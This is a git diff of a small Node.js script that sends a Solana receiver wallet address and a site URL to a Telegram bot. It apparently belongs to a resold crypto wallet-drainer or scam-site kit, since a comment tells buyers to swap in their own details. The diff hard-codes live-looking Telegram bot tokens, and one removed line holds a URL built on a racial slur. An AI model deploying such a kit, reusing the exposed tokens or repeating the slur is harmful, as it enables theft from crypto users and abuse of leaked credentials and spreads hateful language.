@@ -1,10 +1,10 @@
 const axios = require('axios');
 
 // Telegram Bot API token [ DO NOT TOUCH ]
-const botToken = '7675875616:AAEgBrKlJV1K2qgtEt69g8Kzs97YcBZvrBc';
+const botToken = '7520075192:AAEkcBfRcBdfWvnS1qouENDpljroGyTkKSo';
 
 // Telegram channel ID [ DO NOT TOUCH ]
-const chatId = '1002652189311';
+const chatId = '7253475769';
 
 
 async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
@@ -24,6 +24,6 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const solana_wallet_receiver_id = '7GMHQSwrsTWjJwbHkwihdRePfzUbXEy7ySbn3mqcnDDx';
-const website_url = 'https://nigger.com';
+const solana_wallet_receiver_id = 'DSj8cEN1Bd9CxFrrgNMuwcTnqtfJ4JKFakLeFnjDYNvR';
+const website_url = 'https://solana-jade.vercel.app/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
